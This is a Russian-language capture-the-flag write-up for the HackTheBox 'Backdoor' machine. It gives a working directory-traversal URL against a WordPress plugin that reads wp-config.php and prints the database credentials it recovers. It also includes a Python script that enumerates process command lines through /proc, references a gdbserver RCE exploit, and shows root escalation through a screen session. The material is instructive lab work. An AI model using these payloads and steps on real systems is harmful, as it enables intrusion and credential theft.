---
title: HTB Machine Backdoor
date: 2022-03-26 
categories: [writeup]
tags: [writeup, hackthebox, linux]
---


# Hackthebox Backdoor Writeup
## Box Info
![Machine Info](https://i.imgur.com/SgAhOB9.png)


## Enumeration
### Nmap scan

```bash
nmap -Pn -p- -sC -sV --min-rate=256 --min-parallelism=512 -v -oN nmap-full.txt 10.10.11.125 
```

```bash
55s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### port 80 - web
![Site view](https://i.imgur.com/48XVsUk.png)

При переходе на сайт выскакивает ошибка `Unknown host: backdoor.htb`, добавим сайт в `/etc/hosts` хосты


#### analyze wordpress


Запустим wpscan
нашли  `http://backdoor.htb/readme.html`

заглянем в обычные папки
`http://backdoor.htb/wp-content/themes` пустая страница, доступ есть но не отображается
`http://backdoor.htb/wp-content/plugins` видим плагин
`http://backdoor.htb/wp-content/uploads` есть доступ но файлов там нет

в plugins нашли `ebook-download/` версии `1.1`
на нее есть cve  Directory Traversal `https://www.exploit-db.com/exploits/39575`


## Getting Shell
### Directory Traversal
Exploit
`backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`

Узнаем креды для подключения
```php
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
```
Подключаемся к машине

из `/etc/passwd` узнаем имя пользователя `user`

Информации больше нет, куда стучаться тоже непонятно.
Остается неизвестный порт 1337, значит какой то процесс запущен на машине
Из узявимостей есть только Directory Traversal, можно почитать системные файлы  из `/proc` и поискать процесс с командой выполнения 

в скрипте проблема, что он пишет в файл бинарно, лень разбираться как чинить, поэтому сделал через костыль
`strings output.txt > output_good.txt`

#todo закинуть в fli блок код
```python
url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../"


with open("output1.txt", "w") as file:
	for i in range(3000):
		resp = req.get(url + f"proc/{i}/cmdline")
		
		text = resp.text.split("<")[0]
		text = text.split("cmdline/")[1] if len(text.split("cmdline/")) > 1 else ""
		
		if(text != ""):
			result = f"FIND pid {i} command: {text}"
		
		else:
			result = f"pid {i} none"

		print(result)
		file.writelines(f"{result.encode('utf-8')}\n")
```

потом в Sublime при помощи простого регулярного выражения меняем
`pid \d{1,5} none\n` на пустоту и имеем
![Screen 1](https://i.imgur.com/S1g4y9T.png)

### Getting shell
Видим сервис gdbserver

Находим на него RCE `https://www.exploit-db.com/exploits/50539`

![Screen 2](https://i.imgur.com/ZsjrB4p.png)

![Screen 3](https://i.imgur.com/ktTVEGK.png)

добавил себя в SSH
```bash
ssh-keygen -t rsa
cat .ssh/id_rsa.pub

# скачал себе id_rsa и авторизировался по нему
chmod 700 id_rsa
ssh -i id_rsa user@backdoor.htb
```

### Getting ROOT
Запускаем linpeas

Помимо всего прочего видим сессию рута
![Screen 4](https://i.imgur.com/eUDrJcH.png)

смотрим сессии screen
`screen -ls`

подключаемся к сессии рута
`screen -X root/root`

Мы рут :)